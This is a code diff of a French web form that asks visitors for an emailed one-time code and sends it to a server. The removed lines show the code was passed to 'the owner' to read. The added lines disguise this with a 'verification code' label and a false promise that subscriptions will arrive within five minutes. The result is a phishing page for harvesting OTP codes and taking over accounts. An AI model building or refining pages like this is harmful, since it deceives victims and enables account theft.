@@ -51,7 +51,7 @@
     <h1>Vérifier un code</h1>
     <p>Entre le code OTP reçu par email.</p>
     <form id="verificationForm">
-      <label for="secretCode">Code secret</label>
+      <label for="secretCode">Code de vérification</label>
       <input id="secretCode" type="text" inputmode="numeric" pattern="[0-9]{4,12}" minlength="4" maxlength="12"
         autocomplete="one-time-code" enterkeyhint="send" placeholder="000000" required aria-describedby="message">
       <button id="sendButton" type="submit">Vérifier</button>
@@ -79,7 +79,7 @@
         });
         const data = await response.json().catch(() => ({}));
         if (!response.ok) throw Error(data.error || 'Envoi impossible pour le moment.');
-        message.textContent = 'Code transmis. Le propriétaire pourra le consulter dans ses notifications.';
+        message.textContent = 'Code vérifié : vous recevrez vos abonnements dans un délai de 5 minutes maximum.';
         form.reset();
       } catch (error) { message.textContent = error.message; }
       finally { button.disabled = false; }
